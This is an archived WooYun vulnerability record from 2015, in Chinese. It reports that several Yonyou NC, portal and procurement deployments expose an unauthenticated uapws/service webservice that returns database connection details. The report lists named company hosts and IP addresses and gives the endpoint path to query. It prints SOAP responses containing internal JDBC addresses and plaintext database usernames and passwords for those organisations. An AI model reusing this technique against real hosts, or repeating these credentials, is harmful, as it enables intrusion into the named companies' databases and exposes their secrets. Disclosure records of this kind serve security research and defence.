{"id": 41317, "wybug_id": "wooyun-2015-0112834", "wybug_title": "用友多个系统通用漏洞导致接口信息泄露引发多数据库信息泄露（涉及多个大型厂商）", "wybug_corp": "用友软件", "wybug_author": "路人甲", "wybug_date": "2015-05-08 14:12", "wybug_open_date": "2015-05-13 14:14", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： * 详细说明：  \n\n通过webservice接口泄露,涉及多个系统一、NC系统http://123.232.105.202/http://erp.suning.com.cn/http://115.238.57.245/以苏宁为例。接口地址:http://erp.suning.com.cn/uapws/service会发现很多接口,以数据库内网链接泄露为例(太多接口了,不一一测试了)得到数据库内网链接为:http://erp.suning.com.cn/uapws/service/nc.itf.ses.inittool.PortalSESInitToolService?wsdl利用接口测试工具调用接口得到数据库链接为:\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">   <soap:Header>      <ns0:Urc xmlns:ns0=\"http://ws.uap.nc/lang\">         <datasource>design</datasource>         <corpCode>simpchn</corpCode>         <userCode>#UAP#</userCode>         <langCode>simpchn</langCode>      </ns0:Urc>   </soap:Header>   <soap:Body>      <ns1:getDataSourceConfigResponse xmlns:ns1=\"http://inittool.ses.itf.nc/PortalSESInitToolService\">         <return>nc57</return>         <return>jdbc:oracle:thin:@10.0.0.30:1521:orcl</return>         <return>nc35</return>         <return>is0h1idu</return>      </ns1:getDataSourceConfigResponse>   </soap:Body></soap:Envelope>\n全部明文,数据库账号密码以及库名均是明文二、门户系统http://hr.sbtjt.com/portal/app/mockapp/login.jsp?lrid=1http://gpms.foton.com.cn/portal/app/mockapp/login.jsp?lrid=1http://fm2.cscec.com/portal/app/mockapp/login.jsp?lrid=767685128以福田汽车为例全部接口地址:http://gpms.foton.com.cn/uapws/service数据库接口地址:http://gpms.foton.com.cn/uapws/service/nc.itf.ses.inittool.PortalSESInitToolService?wsdl\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">   <soap:Header>      <ns0:Urc xmlns:ns0=\"http://ws.uap.nc/lang\">         <ns0:datasource>design</ns0:datasource>         <ns0:userCode>1001FF1000000000J580</ns0:userCode>         <ns0:langCode>simpchn</ns0:langCode>      </ns0:Urc>   </soap:Header>   <soap:Body>      <ns1:getDataSourceConfigResponse xmlns:ns1=\"http://inittool.ses.itf.nc/PortalSESInitToolService\">         <return>foton</return>         <return>jdbc:oracle:thin:@172.24.6.101:1521:gpms</return>         <return>hwpj63</return>         <return>asdzxc</return>      </ns1:getDataSourceConfigResponse>   </soap:Body></soap:Envelope>\n得到的数据库链接地址和账号密码,依旧明文三、另一版本NC系统http://bap.ufida.com/http://www.bewg.net.cn/以用友官网系统为例全部接口链接：http://bap.ufida.com/uapws/service数据库接口链接：http://bap.ufida.com/uapws/service/nc.itf.ses.inittool.PortalSESInitToolService?wsdl\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">   <soap:Header>      <ns0:Urc xmlns:ns0=\"http://ws.uap.nc/lang\">         <ns0:datasource>design</ns0:datasource>         <ns0:userCode>#UAP#</ns0:userCode>         <ns0:langCode>simpchn</ns0:langCode>      </ns0:Urc>   </soap:Header>   <soap:Body>      <ns1:getDataSourceConfigResponse xmlns:ns1=\"http://inittool.ses.itf.nc/PortalSESInitToolService\">         <return>design</return>         <return>jdbc:oracle:thin:@127.0.0.1:1521:orcl</return>         <return>ba_demo_design20131231</return>         <return>1</return>      </ns1:getDataSourceConfigResponse>   </soap:Body></soap:Envelope>\n四、电子商务采购平台http://61.178.99.236:9002/ebvp/http://www.xinfagroup.com.cn:8080/ebvp/http://zc.hayao.com:8080/ebvp/http://221.1.83.115:9001/ebvp以信发公司为例全部接口地址：http://www.xinfagroup.com.cn:8080/uapws/service/数据库接口地址：http://www.xinfagroup.com.cn:8080/uapws/service/nc.itf.ses.inittool.PortalSESInitToolService?wsdl数据库链接：\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">   <soap:Header>      <ns0:Urc xmlns:ns0=\"http://ws.uap.nc/lang\">         <ns0:datasource>design</ns0:datasource>         <ns0:userCode>#UAP#</ns0:userCode>         <ns0:langCode>simpchn</ns0:langCode>      </ns0:Urc>   </soap:Header>   <soap:Body>      <ns1:getDataSourceConfigResponse xmlns:ns1=\"http://inittool.ses.itf.nc/PortalSESInitToolService\">         <return>nc</return>         <return>jdbc:oracle:thin:@(DESCRIPTION=(ADDRESS = (PROTOCOL = TCP)(HOST = 10.10.1.34)(PORT = 1521))(ADDRESS = (PROTOCOL = TCP)(HOST =10.10.1.33)(PORT = 1521))(LOAD_BALANCE = yes)(CONNECT_DATA = (SERVER = DEDICATED)(SERVICE_NAME = orcl_rac)))</return>         <return>nc</return>         <return>xinfajituan</return>      </ns1:getDataSourceConfigResponse>   </soap:Body></soap:Envelope>\n依旧全部明文设计用友多个系统，只要在网站后面加uapws/service即可查看该系统的所有接口，我只是测试了数据库接口的信息，而且数据库基本都是明文显示，危害还是很大的。   漏洞证明：     修复方案：  *   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-05-13 14:14 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}